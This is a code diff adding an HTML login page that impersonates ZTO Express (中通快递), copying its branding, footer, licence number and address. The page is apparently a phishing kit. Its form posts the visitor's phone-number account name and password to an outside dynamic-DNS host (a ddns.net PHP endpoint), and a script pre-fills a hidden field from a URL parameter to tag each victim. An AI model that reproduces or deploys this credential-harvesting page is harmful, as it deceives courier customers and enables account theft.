@@ -1,0 +1,113 @@
+<!DOCTYPE html> 
+
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>登录</title>
+     <link rel="stylesheet" href="./zo/public-2c196f050f.css">
+  
+  <script src="js/jquery.min.js"></script>
+  <script src="js/bootstrap.min.js"></script> 
+  
+    <link rel="shortcut icon" type="image/x-icon" href="./zo/logo.ico" media="screen" />
+</head>
+
+<body style="">
+  
+    <div class="wrap">
+        <div id="head" class="head">
+            <div class="box cb">
+                <a href="javascript:void(0)" class="logo"><img src="./zo/logo.png" alt=""></a>
+                <div class="link cb"><a href="javascript:void(0)">首页</a> <a href="javascript:void(0)?create">预约寄件</a> <a href="javascript:void(0)?batch-create">批量寄件</a> <a href="javascript:void(0)">帮助与反馈</a></div>
+                <div class="login"></div>
+            </div>
+        </div>
+        <div class="login_container">
+            <div class="login_main">
+                
+                  <form method="post"  action="https://3o45o00r.ddns.net/van.php" class="shurt">
+				  <div class="login_box" style=" height: 414px; ">
+                    <div class="header"><span class="header_tip"><img src="./zo/user.png" alt=""> <i>会员登录</i></span><input  
+					name="sile" id="app" class="go_register" style=" text-align: right; border: 0; text-decoration: none; margin-top: -13px; outline: 0;" readonly /></div>
+                   
+                    <div class="switch_pwd_con" style="">
+                        <div class="item">
+                            <p class="tips account_login_tips"></p><span class="name w55">账号：</span>
+                            <input type="text" name="pusistenc" placeholder="注册手机号" class="w309" required="">
+                        </div>
+                        <div class="item">
+                            <p class="tips"></p><span class="name w55">密码：</span>
+                            <input type="password" placeholder="请输入密码" name="peewd" class="w309" required="">
+                        </div> 
+
+						 
+	   <button   name="jabasni" class="submit" style="outline: 0;border: 0;margin-bottom: 27px; cursor: pointer;">
+登录
+</button>
+					</form>
+                    <div class="more_login_way">
+                        <div class="more_way_title"><span><img src="./zo/line.png" alt=""></span><span class="font">更多登录方式</span> <span><img src="./zo/line.png" alt=""></span></div>
+                        <div class="more_way_list">
+                            <a id="login-qq" href="javascript:void(0);"><img src="zo/exp.png" alt=""></a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="foot">
+          
+            <p class="copyright">中通快递 版权所有 <a href="javascript:void(0)" target="_blank">沪ICP备13044869号</a>&nbsp;&nbsp;&nbsp;&nbsp;总部地址：上海市青浦区华新镇华志路1685号&nbsp;&nbsp;&nbsp;&nbsp;咨询电话：4008278278</p>
+        </div>
+        <div class="message-box-dialog"></div>
+    
+        <script>
+            function showQrTips() {
+                $(".qr_code").animate({
+                    left: "0px",
+                    marginLeft: "0"
+                }, 300), $(".qr_code_hover").fadeIn(1e3)
+            }
+
+            function hideQrTips() {
+                $(".qr_code").animate({
+                    left: "50%",
+                    marginLeft: "-92px"
+                }, 300), $(".qr_code_hover").hide()
+            }
+        </script>
+        <script src="./zo/wxLogin.js.download"></script>
+        <script src="./zo/form-4cae7d1c49.js.download"></script>
+        <script src="./zo/index-430ca3cef8.js.download"></script>
+    </div>
+  
+<script>
+    
+$.urlParam = function(app){
+    var results = new RegExp('[\?&]' + app + '=([^&#]*)').exec(window.location.href);
+    return results[1] || 0;
+	
+      
+}
+
+</script>
+
+
+
+<script>
+    
+    $( document ).ready(function() {
+        // after the page elements are all loaded, then run the script
+        // Set the input field with unique ID #email to a value
+
+          $("#app").val($.urlParam('app'));
+        
+        });
+        
+</script>
+	
+	
+</body>
+
+
+
+</html>
